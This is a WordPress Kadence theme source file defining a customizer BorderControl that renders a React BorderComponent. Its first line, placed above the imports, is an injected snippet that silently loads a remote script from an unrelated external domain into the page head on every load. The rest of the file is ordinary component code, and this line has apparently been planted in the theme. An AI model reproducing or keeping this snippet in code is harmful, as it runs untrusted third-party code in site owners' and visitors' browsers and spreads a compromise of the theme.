(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
import { createRoot } from '@wordpress/element';
import BorderComponent from './border-component.js';

export const BorderControl = wp.customize.KadenceControl.extend( {
	renderContent: function renderContent() {
		let control = this;
		let root = createRoot( control.container[0] );
		root.render( <BorderComponent control={control} customizer={ wp.customize }/> );
		// ReactDOM.render(
		// 		<BorderComponent control={control} customizer={ wp.customize }/>,
		// 		control.container[0]
		// );
	}
} );
